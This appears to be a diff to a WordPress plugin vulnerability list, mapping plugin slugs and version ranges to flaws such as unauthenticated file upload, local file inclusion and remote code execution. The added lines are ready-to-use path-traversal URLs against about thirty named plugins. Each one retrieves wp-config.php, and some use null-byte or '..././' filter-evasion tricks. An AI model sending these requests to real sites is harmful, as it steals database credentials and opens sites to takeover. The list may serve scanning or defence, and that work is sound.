@@ -20,7 +20,9 @@ ads-by-datafeedrcom|< 1.2.0|Ads by datafeedr.com < 1.2.0 - Unauthenticated Remot
 advanced-access-manager|< 5.9.9|Advanced Access Manager < 5.9.9 - Unauthenticated Local File Inclusion
 advanced-ajax-page-loader|< 2.7.7|Advanced Ajax Page Loader < 2.7.7 - Unauthenticated Uploaded File Disclosure
 advanced-ajax-page-loader|<= 2.7.7|Advanced AJAX Page Loader <= 2.7.7 - Cross-Site Request Forgery to Arbitrary File Upload
+advanced-dewplayer|all|/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php
 advanced-online-ordering-and-delivery-platform|<= 2.0.0|Advanced Online Ordering and Delivery Platform <= 2.0.0 - Unauthenticated Local File Inclusion
+advanced-uploader|all|/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../../../../../../../wp-config.php%00
 affiliator-lite|<= 2.1.3|Affiliator <= 2.1.3 - Unauthenticated Arbitrary File Upload
 ahime-image-printer|<= 1.0.0|Ahime Image Printer <= 1.0.0 - Unauthenticated Arbitrary File Download
 ai-engine|< 1.9.99|AI Engine: ChatGPT Chatbot < 1.9.99 - Unauthenticated Arbitrary File Upload
@@ -46,6 +48,7 @@ ar-for-wordpress|< 7.0|AR For WordPress < 7.0 - Unauthenticated Arbitrary File U
 ar-for-wordpress|< 7.4|AR for WordPress < 7.4 - Missing Authorization to Unauthenticated Limited File Upload
 art-picture-gallery|<= 1.2.9|Art-Picture-Gallery <= 1.2.9 - Unauthenticated Arbitrary File Upload
 asgaros-forum|< 2.7.1|Asgaros Forum < 2.7.1 - Unauthenticated Arbitrary File Upload
+aspose-doc-exporter|all|/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php
 asset-manager|= 0.2|Asset Manager 0.2 - Arbitrary File Upload
 attachment-file-icons|<= 1.3|Attachment File Icons (AF Icons) <= 1.3 - Cross-Site Request Forgery to Arbitrary File Upload
 auctionPlugin|= 2.0.1.3|Sitemile Auctions 2.0.1.3 - wp-content/plugins/auctionPlugin/upload.php File Upload PHP Code Execution
@@ -79,6 +82,7 @@ booking-calendar|< 3.2.2|Booking Calendar < 3.2.2 - Unauthenticated Arbitrary Fi
 booking-calendar|<= 3.2.15|Booking calendar, Appointment Booking System <= 3.2.15 - Unauthenticated Stored Cross-Site Scripting via SVG File Upload
 booking-ultra-pro|< 1.1.14|Booking Ultra Pro < 1.1.14 - Unauthenticated Local File Inclusion
 bookingpress-appointment-booking|< 1.1.23|BookingPress < 1.1.23 - Unauthenticated Export File Download
+bookx|all|/wp-content/plugins/bookx/includes/bookx_export.php?file=../../../../wp-config.php 
 bp-better-messages|< 1.9.9.149|Better Messages < 1.9.9.149 - File Upload via CSRF
 bp-cover|<= 2.1.4.2|BuddyPress Cover <= 2.1.4.2 - Unauthenticated Arbitrary File Upload
 brandfolder|<= 3.0|Brandfolder <= 3.0 - File Inclusion
@@ -101,6 +105,7 @@ chauffeur-booking-system|< 7.3|Chauffeur Taxi Booking System for WordPress < 7.3
 cherry-plugin|< 1.2.7|Cherry Plugin < 1.2.7 - Unauthenticated Arbitrary File Upload and Download
 chikuncount|all|chikuncount - ofc_upload_image.php Arbitrary File Upload
 cimy-user-extra-fields|all|Cimy User Extra Fields - Arbitrary File Upload
+cloudsafe365-for-wp|all|/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file=../../../../../wp-config.php
 cms-pack-cache|= 1.3|Cms Pack 1.3 - Shell Upload
 college-publisher-import|<= 0.1|College Publisher Import <= 0.1 - Arbitrary File Upload to RCE
 complete-gallery-manager|= 3.3.3|Complete Gallery Manager 3.3.3 - Arbitrary File Upload
@@ -120,6 +125,7 @@ csv2wpec-coupon|<= 1.1|Csv2WPeC Coupon <= 1.1 - Unauthenticated Remote File Uplo
 customify-sites|<= 0.0.9|Customify Site Library <= 0.0.9 - Unauthenticated Remote Code Execution
 cysteme-finder|<= 1.3|CYSTEME Finder <= 1.3 - Unauthenticated LFI and Unauthenticated File Upload
 datasets-manager-by-arttia-creative|<= 1.5|Datasets Manager by Arttia Creative <= 1.5 - Unauthenticated Arbitrary File Upload
+db-backup|all|/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php
 delete-all-comments|= 2.0|Delete All Comments 2.0 - Unauthenticated Arbitrary File Upload
 devexhub-gallery|<= 2.0.1|Devexhub Gallery <= 2.0.1 - Unauthenticated Arbitrary File Upload
 digipass|<= 0.3.0|DigiPass <= 0.3.0 - Unauthenticated Arbitrary File Download
@@ -132,6 +138,7 @@ download-manager|< 3.2.85|Download Manager < 3.2.85 - Unauthenticated File Downl
 drag-and-drop-multiple-file-upload-contact-form-7|< 1.3.3.3|Drag and Drop Multiple File Upload for Contact Form 7 < 1.3.3.3 - Unauthenticated File Upload Bypass
 drag-and-drop-multiple-file-upload-contact-form-7|< 1.3.7.4|Drag and Drop Multiple File Upload - Contact Form 7 < 1.3.7.4 - Unauthenticated Arbitrary File Upload
 dropbox-folder-share|<= 1.9.7|Dropbox Folder Share <= 1.9.7 - Unauthenticated Remote Code Execution via LFI
+dukapress|all|/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php
 duplicator-pro|= 1.3.24|Duplicator 1.3.24 - Unauthenticated Arbitrary File Download
 duplicator-pro|= 1.3.26|Duplicator 1.3.26 - Unauthenticated Arbitrary File Download
 duplicator|= 1.3.24|Duplicator 1.3.24 - Unauthenticated Arbitrary File Download
@@ -143,6 +150,7 @@ dzs-zoomsounds|< 6.50|DZS Zoomsounds < 6.50 - Unauthenticated Arbitrary File Dow
 e-signature|< 1.5.6.8|e-signature < 1.5.6.8 - Unauthenticated Arbitrary File Upload leading to RCE
 easy-csv-importer|<= 7.0.0|eaSYNC < 1.1.16 - Unauthenticated Arbitrary File UploadEasy CSV Importer BETA <= 7.0.0 - Unauthenticated Arbitrary File Upload
 easync-booking|< 1.1.16|eaSYNC < 1.1.16 - Unauthenticated Arbitrary File Upload
+ebook-download|all|/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
 edd-recent-purchases|<= 1.0.2|Easy Digital Downloads – Recent Purchases <= 1.0.2 - Unauthenticated Remote File Inclusion
 editormonkey|all|EditorMonkey - (FCKeditor) Arbitrary File Upload
 email-artillery|<= 4.1|Email Artillery <= 4.1 - Arbitrary File Upload
@@ -164,6 +172,7 @@ fediverse-embeds|< 1.5.4|Fediverse Embeds < 1.5.4 - Unauthenticated Arbitrary Fi
 feed-comments-number|<= 0.2.1|Feed Comments Number <= 0.2.1 - Unauthenticated Arbitrary File Upload
 file-manager-advanced-shortcode|<= 2.3.2|File Manager Advanced Shortcode <= 2.3.2 - Unauthenticated Remote Code Execution through shortcode
 file-manager|<= 6.5.5|Bit File Manager 6.0 - 6.5.5 - Unauthenticated Remote Code Execution via Race Condition
+filedownload|all|/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php
 filester|< 1.8|File Manager Pro < 1.8 - Remote Code Execution via CSRF
 fileviewer|<= 2.2|Fileviewer <= 2.2 - Arbitrary File Upload/Deletion via CSRF
 finale-woocommerce-sales-countdown-timer-discount|<= 2.9.0|Finale WooCommerce Sale Countdown <= 2.9.0 - Arbitrary File Upload
@@ -193,11 +202,13 @@ haxcan|<= 1.0.0|Haxcan <= 1.0.0 - Arbitrary File Access
 hb-audio-gallery-lite|all|/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10
 hb-audio-gallery|<= 3.0|HB AUDIO GALLERY <= 3.0 - Unauthenticated Arbitrary File Upload
 helloprint|< 2.0.5|Helloprint < 2.0.5 - Unauthenticated Arbitrary File Upload
+history-collection|all|/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php
 html2wp|<= 1.0.0|HTML2WP <= 1.0.0 - Unauthenticated Arbitrary File Upload
 image-classify|<= 1.0.0|Image Classify <= 1.0.0 - Unauthenticated Arbitrary File Upload
+image-export|all|/wp-content/plugins/image-export/download.php?file=../../../wp-config.php
 image-gallery-with-slideshow|<= 1.5|image-gallery-with-slideshow <= 1.5 - Arbitrary File Upload / SQL Injection
 imagements|<= 1.2.5|Imagements <= 1.2.5 - Unauthenticated Arbitrary File Upload to RCE
-imdb-widget|<= 1.0.8|IMDb Profile Widget <= 1.0.8 - Local File Inclusion (LFI)
+imdb-widget|<= 1.0.8|IMDb Profile Widget <= 1.0.8 - Local File Inclusion (LFI) & /wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
 import-xml-feed|<= 2.1.4|Import XML and RSS Feeds <= 2.1.4 - Unauthenticated Remote Code Execution
 inboundio-marketing|<= 2.0.3|InBoundio Marketing Plugin <= 2.0.3 - Shell Upload
 indeed-membership-pro|<= 7.5|Ultimate Membership Pro <= 7.5 - Arbitrary media upload
@@ -233,7 +244,7 @@ mappress-google-maps-for-wordpress|< 2.53.9|MapPress Maps Pro < 2.53.9 - Remote 
 masterstudy-lms-learning-management-system|< 3.3.1|MasterStudy LMS < 3.3.1 - Unauthenticated Local File Inclusion via modal
 masterstudy-lms-learning-management-system|< 3.3.4|MasterStudy LMS < 3.3.4 - Unauthenticated Local File Inclusion via template
 membership-for-woocommerce|< 2.1.7|Membership For WooCommerce < 2.1.7 - Unauthenticated Arbitrary File Upload
-membership-simplified-for-oap-members-only|<= 1.58|Membership Simplified <= 1.58 - Unauthenticated Arbitrary File Download
+membership-simplified-for-oap-members-only|<= 1.58|Membership Simplified <= 1.58 - Unauthenticated Arbitrary File Download && /wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php
 metform|< 3.3.0|Metform Elementor Contact Form Builder < 3.3.0 - Unauthenticated Double-Extension Arbitrary File Upload
 metform|<= 3.2.4|Metform Elementor Contact Form Builder <= 3.2.4 - Unauthenticated Double-Extension Arbitrary File Upload
 mh-board|<= 1.3.2.1|MH Board <= 1.3.2.1 - Unauthenticated Local File Inclusion
@@ -295,6 +306,8 @@ royal-elementor-addons|< 1.3.79|Royal Elementor Addons and Templates < 1.3.79 - 
 royal-elementor-addons|<= 1.3.94|Royal Elementor Addons and Templates <= 1.3.94 - Unauthenticated Limited File Upload
 royal-elementor-addons|= 1.4.78|Royal Elementor Addons and Templates 1.4.78 - Unauthenticated Arbitrary File Upload
 rsvpmaker-for-toastmasters|< 6.2.5|RSVPMaker for Toastmasters < 6.2.5 - Unauthenticated Arbitrary File Upload
+s3bubble-amazon-s3-html-5-video-with-adverts|all|/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php
+s3bubble-amazon-s3-html-5-video-with-adverts|all|/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php
 safe-ai-malware-protection-for-wp|<= 1.0.17|Safe Ai Malware Protection for WP <= 1.0.17 - Missing Authorization to Unauthenticated Database Export
 salon-booking-system|< 10.3|Salon Booking System < 10.3 - Unauthenticated Arbitrary File Upload
 sam-pro-free|< 1.9.7.69|SAM Pro (Free Edition) < 1.9.7.69 - Local File Inclusion (LFI)
@@ -302,6 +315,7 @@ school-management|< 92.0.0|School Management < 92.0.0 - Unauthenticated Arbitrar
 scottcart|<= 1.1|ScottCart <= 1.1 - Unauthenticated Remote Code Execution
 scripts-organizer|< 3.0|Scripts Organizer < 3.0 - Unauthenticated Arbitrary File Upload
 searchwp-live-ajax-search|< 1.6.3|SearchWP Live Ajax Search < 1.6.3 - Unauthenticated Local File Inclusion
+sell-downloads|all|/wp-content/plugins/sell-downloads/sell-downloads.php?file=../../../../../../../../.././wp-config.php%00
 seo-beginner-auto-post|<= 2.2.1|SEO LAT Auto Post <= 2.2.1 - Missing Authorization to File Overwrite/Upload (Remote Code Execution)
 sermon-browser|<= 0.45.22|Sermon Browser <= 0.45.22 - Arbitrary File Upload via CSRF
 sfwd-lms|< 2.5.4|LearnDash < 2.5.4 - Unauthenticated Arbitrary File Upload
@@ -338,6 +352,7 @@ supportcandy|<= 2.0.0|SupportCandy <= 2.0.0 - Arbitrary File Upload
 swift-performance-lite|< 2.3.7.2|Swift Performance Lite < 2.3.7.2 - Unauthenticated Local PHP File Inclusion via 'ajaxify'
 tajer|all|Tajer - Unauthenticated Arbitrary File Upload
 terraclassifieds|<= 2.0.3|TerraClassifieds <= 2.0.3 Unauthenticated Arbitrary File Upload
+thecartpress|all|/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00
 theplus_elementor_addon|< 5.2.9|The Plus Addons for Elementor Pro < 5.2.9 - Unauthenticated Local File Inclusion
 time-clock-pro|<= 1.2.2|Time Clock <= 1.2.2 & Time Clock Pro <= 1.1.4 - Unauthenticated (Limited) Remote Code Execution
 time-clock|<= 1.2.2|Time Clock <= 1.2.2 & Time Clock Pro <= 1.1.4 - Unauthenticated (Limited) Remote Code Execution
@@ -382,6 +397,7 @@ wp-cookies-enabler|<= 1.0.1|WP Cookies Enabler <= 1.0.1 - Unauthenticated Local 
 wp-curriculo-vitae|<= 6.3|WP-Curricul Vitea Free <= 6.3 - Unauthenticated Arbitrary File Upload to RCE
 wp-dropbox-dropins|<= 1.0|WP Dropbox Dropins <= 1.0 - Unauthenticated Arbitrary File Upload
 wp-dummy-content-generator|<= 3.2.1|WP Dummy Content Generator <= 3.2.1 - Unauthenticated Code Injection
+wp-ecommerce-shop-styling|all|/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php
 wp-fastest-cache|<= 0.8.5.9|WP Fastest Cache <= 0.8.5.9 - Local File Inclusion (LFI)
 wp-file-manager-pro|<= 8.3.9|File Manager Pro <= 8.3.9 - Unauthenticated Backup File Download and Upload
 wp-file-manager-pro|<= 8.3.9|File Manager Pro <= 8.3.9 - Unauthenticated Limited JavaScript File Upload
@@ -408,6 +424,7 @@ wp-query-console|<= 1.0|WP Query Console <= 1.0 - Unauthenticated Remote Code Ex
 wp-responsive-slider-with-lightbox|< 1.0.1|Thumbnail Slider With Lightbox < 1.0.1 - Arbitrary File Upload via CSRF
 wp-rocket|<= 2.10.3|WP Rocket <= 2.10.3 - Local File Inclusion (LFI)
 wp-simple-firewall|< 18.5.10|Shield Security – Smart Bot Blocking & Intrusion Prevention Security < 18.5.10 - Unauthenticated Local File Inclusion
+wp-source-control|all|/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php
 wp-ticket-ultra|<= 1.0.5|WP Ticket Ultra Help Desk & Support Plugin <= 1.0.5 - Unauthenticated Local File Inclusion
 wp-time-capsule|< 1.22.22|Backup and Staging by WP Time Capsule < 1.22.22 - Unauthenticated Arbitrary File Upload
 wp-timelines|< 3.6.8|WP Timeline – Vertical and Horizontal timeline plugin < 3.6.8 - Unauthenticated Local File Inclusion
